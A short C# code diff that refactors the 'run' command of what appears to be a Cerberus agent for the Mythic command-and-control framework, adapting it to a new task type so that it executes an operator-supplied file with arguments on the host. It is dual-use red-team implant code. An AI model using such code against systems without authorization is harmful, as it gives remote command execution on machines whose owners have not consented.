@@ -11,13 +11,15 @@ namespace Cerberus.Commands
     {
         public override string Name => "run";
 
-        public override string Execute(CerberusTask task)
+        public override string Execute(MythicTask task)
         {
-            if (task.Arguments is null || task.Arguments.Length == 0)
+            var Arguments = task.parameters.Split(' ');
+
+            if (Arguments is null || Arguments.Length == 0)
                 return "No arguments supplied. Must supply file to execute and any required arguments";
 
-            var fileName = task.Arguments[0];
-            var args = string.Join(" ", task.Arguments.Skip(1));
+            var fileName = Arguments[0];
+            var args = string.Join(" ", Arguments.Skip(1));
 
             return Internal.Execute.ExecuteCommand(fileName, args);
         }
